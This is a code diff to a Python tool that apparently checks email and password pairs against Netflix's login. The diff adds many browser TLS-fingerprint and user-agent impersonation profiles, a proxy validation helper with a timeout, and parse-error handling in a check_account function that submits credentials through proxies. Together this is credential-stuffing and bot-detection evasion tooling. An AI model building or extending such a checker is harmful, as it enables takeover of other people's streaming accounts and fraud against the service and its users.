@@ -4,6 +4,7 @@ import uuid
 import random
 import re
 import json
+import html
 import datetime
 import threading
 import tempfile
@@ -56,8 +57,26 @@ _ENC_OLD  = "gzip, deflate, br"
 TLS_PROFILES = [
     # ── Chrome (Windows) ────────────────────────────────────────────────────
     {
-        "name": "Chrome 133 (Windows)",
-        "impersonate": "chrome133",
+        "name": "Chrome 142 (Windows)",
+        "impersonate": "chrome142",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="142", "Google Chrome";v="142", "Not(A:Brand";v="24"',
+        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
+        "accept_nav": _CH, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
+    },
+    {
+        "name": "Chrome 136 (Windows)",
+        "impersonate": "chrome136",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="136", "Google Chrome";v="136", "Not(A:Brand";v="24"',
+        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
+        "accept_nav": _CH, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
+    },
+    {
+        "name": "Chrome 133 PSK (Windows)",
+        "impersonate": "chrome133a",
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
         "sec_ch_ua": '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',
         "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
@@ -74,47 +93,20 @@ TLS_PROFILES = [
         "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
     },
     {
-        "name": "Chrome 130 (Windows)",
-        "impersonate": "chrome130",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
+        "name": "Chrome 124 (macOS)",
+        "impersonate": "chrome124",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
         "accept_nav": _CH, "accept_api": "*/*",
         "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
     },
     {
-        "name": "Chrome 129 (Windows)",
-        "impersonate": "chrome129",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
-    },
-    {
-        "name": "Chrome 128 (Windows)",
-        "impersonate": "chrome128",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
-    },
-    {
-        "name": "Chrome 127 (Windows)",
-        "impersonate": "chrome127",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
-    },
-    {
-        "name": "Chrome 126 (Windows)",
-        "impersonate": "chrome126",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
+        "name": "Chrome 123 (macOS)",
+        "impersonate": "chrome123",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
+        "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
         "accept_nav": _CH, "accept_api": "*/*",
         "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
     },
@@ -163,25 +155,6 @@ TLS_PROFILES = [
         "accept_nav": _CH, "accept_api": "*/*",
         "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
     },
-    # ── Chrome (macOS) ───────────────────────────────────────────────────────
-    {
-        "name": "Chrome 124 (macOS)",
-        "impersonate": "chrome124",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
-    },
-    {
-        "name": "Chrome 123 (macOS)",
-        "impersonate": "chrome123",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
-    },
     {
         "name": "Chrome 104 (Linux)",
         "impersonate": "chrome104",
@@ -218,6 +191,25 @@ TLS_PROFILES = [
         "accept_nav": _CH, "accept_api": "*/*",
         "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
     },
+    # ── Chrome (Android) ─────────────────────────────────────────────────────
+    {
+        "name": "Chrome 131 (Android)",
+        "impersonate": "chrome131_android",
+        "user_agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"',
+        "sec_ch_ua_platform": '"Android"', "sec_ch_ua_mobile": "?1",
+        "accept_nav": _CH, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
+    },
+    {
+        "name": "Chrome 99 (Android)",
+        "impersonate": "chrome99_android",
+        "user_agent": "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
+        "sec_ch_ua": '" Not;A Brand";v="99", "Google Chrome";v="99", "Chromium";v="99"',
+        "sec_ch_ua_platform": '"Android"', "sec_ch_ua_mobile": "?1",
+        "accept_nav": _CH, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
+    },
     # ── Edge (Windows) ───────────────────────────────────────────────────────
     {
         "name": "Edge 131 (Windows)",
@@ -248,6 +240,22 @@ TLS_PROFILES = [
     },
     # ── Firefox ──────────────────────────────────────────────────────────────
     {
+        "name": "Firefox 144 (Windows)",
+        "impersonate": "firefox144",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _FF, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
+    },
+    {
+        "name": "Firefox 135 (Windows)",
+        "impersonate": "firefox135",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _FF, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
+    },
+    {
         "name": "Firefox 133 (Windows)",
         "impersonate": "firefox133",
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
@@ -255,63 +263,48 @@ TLS_PROFILES = [
         "accept_nav": _FF, "accept_api": "*/*",
         "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
     },
+    # ── Tor Browser ──────────────────────────────────────────────────────────
     {
-        "name": "Firefox 120 (Windows)",
-        "impersonate": "firefox120",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
-    },
-    {
-        "name": "Firefox 117 (Linux)",
-        "impersonate": "firefox117",
-        "user_agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 109 (Windows)",
-        "impersonate": "firefox109",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 102 (Windows)",
-        "impersonate": "firefox102",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 100 (macOS)",
-        "impersonate": "firefox100",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 98 (Windows)",
-        "impersonate": "firefox98",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 91 ESR (Windows)",
-        "impersonate": "firefox91esr",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+        "name": "Tor Browser 145 (Windows)",
+        "impersonate": "tor145",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; rv:145.0) Gecko/20100101 Firefox/145.0",
         "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
         "accept_nav": _FF, "accept_api": "*/*",
         "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
     },
     # ── Safari (macOS) ───────────────────────────────────────────────────────
+    {
+        "name": "Safari 26.0.1 (macOS)",
+        "impersonate": "safari2601",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 16_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0.1 Safari/605.1.15",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _SF, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
+    },
+    {
+        "name": "Safari 26.0 (macOS)",
+        "impersonate": "safari260",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 16_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _SF, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
+    },
+    {
+        "name": "Safari 18.4 (macOS)",
+        "impersonate": "safari184",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _SF, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
+    },
+    {
+        "name": "Safari 18.0 (macOS)",
+        "impersonate": "safari18_0",
+        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _SF, "accept_api": "*/*",
+        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
+    },
     {
         "name": "Safari 17.0 (macOS)",
         "impersonate": "safari17_0",
@@ -338,6 +331,22 @@ TLS_PROFILES = [
     },
     # ── Safari (iOS) ─────────────────────────────────────────────────────────
     {
+        "name": "Safari 26.0 (iOS)",
+        "impersonate": "safari260_ios",
+        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _SF, "accept_api": "*/*",
+        "accept_lang": "en-GB,en;q=0.9", "accept_encoding": _ENC_OLD,
+    },
+    {
+        "name": "Safari 18.4 (iOS)",
+        "impersonate": "safari184_ios",
+        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
+        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
+        "accept_nav": _SF, "accept_api": "*/*",
+        "accept_lang": "en-GB,en;q=0.9", "accept_encoding": _ENC_OLD,
+    },
+    {
         "name": "Safari 18.0 (iOS)",
         "impersonate": "safari18_0_ios",
         "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
@@ -353,213 +362,34 @@ TLS_PROFILES = [
         "accept_nav": _SF, "accept_api": "*/*",
         "accept_lang": "en-GB,en;q=0.9", "accept_encoding": _ENC_OLD,
     },
-    {
-        "name": "Safari 18.0 (macOS)",
-        "impersonate": "safari18_0",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _SF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Safari 16.0 (macOS)",
-        "impersonate": "safari16_0",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _SF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Safari 16.0 (iOS)",
-        "impersonate": "safari16_0",
-        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _SF, "accept_api": "*/*",
-        "accept_lang": "en-GB,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    # ── Chrome — older versions (from tls-client profiles) ───────────────────
-    {
-        "name": "Chrome 117 (Windows)",
-        "impersonate": "chrome117",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 112 (Windows)",
-        "impersonate": "chrome112",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 111 (Windows)",
-        "impersonate": "chrome111",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 109 (Windows)",
-        "impersonate": "chrome109",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="109", "Google Chrome";v="109", "Not_A Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 108 (Windows)",
-        "impersonate": "chrome108",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 106 (Windows)",
-        "impersonate": "chrome106",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 105 (macOS)",
-        "impersonate": "chrome105",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 103 (Windows)",
-        "impersonate": "chrome103",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
-        "sec_ch_ua": '" Not;A Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Chrome 133 PSK (Windows)",
-        "impersonate": "chrome133a",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
-        "sec_ch_ua": '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
-    },
-    # ── Firefox — additional versions ────────────────────────────────────────
-    {
-        "name": "Firefox 135 (Windows)",
-        "impersonate": "firefox135",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
-    },
-    {
-        "name": "Firefox 132 (Windows)",
-        "impersonate": "firefox132",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
-    },
-    {
-        "name": "Firefox 123 (Windows)",
-        "impersonate": "firefox123",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 110 (Windows)",
-        "impersonate": "firefox110",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 108 (Windows)",
-        "impersonate": "firefox108",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 106 (macOS)",
-        "impersonate": "firefox106",
-        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 105 (Windows)",
-        "impersonate": "firefox105",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Firefox 104 (Windows)",
-        "impersonate": "firefox104",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
-        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
-        "accept_nav": _FF, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
-    },
-    # ── Opera (Chromium-based) ───────────────────────────────────────────────
-    {
-        "name": "Opera 91 (Windows)",
-        "impersonate": "chrome105",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77",
-        "sec_ch_ua": '"Opera";v="91", "Chromium";v="105", "Not?A_Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
-    {
-        "name": "Opera 90 (Windows)",
-        "impersonate": "chrome104",
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 OPR/90.0.4480.84",
-        "sec_ch_ua": '"Opera";v="90", "Chromium";v="104", "Not?A_Brand";v="99"',
-        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
-        "accept_nav": _CH, "accept_api": "*/*",
-        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
-    },
 ]
-
 
 def validate_proxy(proxy_str):
     proxy_url = parse_proxy(proxy_str)
     if not proxy_url:
         return False, "Could not parse proxy string."
     try:
-        session = cffi_requests.Session(impersonate="chrome133")
+        session = cffi_requests.Session(impersonate="chrome133a")
         session.proxies = {"http": proxy_url, "https": proxy_url}
-        r = session.get("https://api.ipify.org?format=json", timeout=12)
+        r = session.get("https://api.ipify.org?format=json", timeout=10)
         if r.status_code == 200:
             ip = r.json().get("ip", "unknown")
             return True, ip
         return False, f"HTTP {r.status_code} from test endpoint."
     except Exception as e:
         return False, str(e)
+
+
+def timed_validate_proxy(proxy_str, timeout=15):
+    result = [None]
+    def _run():
+        result[0] = validate_proxy(proxy_str)
+    t = threading.Thread(target=_run, daemon=True)
+    t.start()
+    t.join(timeout=timeout)
+    if t.is_alive():
+        return False, f"Timed out after {timeout}s — proxy too slow or unresponsive"
+    return result[0]
 
 
 def pick_profile():
@@ -810,6 +640,11 @@ def check_account(email, password, proxy=None):
     country_small   = COUNTRY_CODE_SMALL.get(country, country.lower())
     country_phone   = COUNTRY_PHONE.get(country, "1")
 
+    if not country:
+        return {"status": "ERROR", "message": f"Login page parse failed — country not found (HTTP {r1.status_code}). Netflix may have changed their page structure."}
+    if not clcs_session_id:
+        return {"status": "ERROR", "message": f"Login page parse failed — clcsSessionId not found (HTTP {r1.status_code}). Netflix may have changed their page structure."}
+
     body = json.dumps({
         "operationName": "CLCSScreenUpdate",
         "variables": {
@@ -889,6 +724,7 @@ def check_account(email, password, proxy=None):
         login_session.proxies = {"http": proxy_url, "https": proxy_url}
 
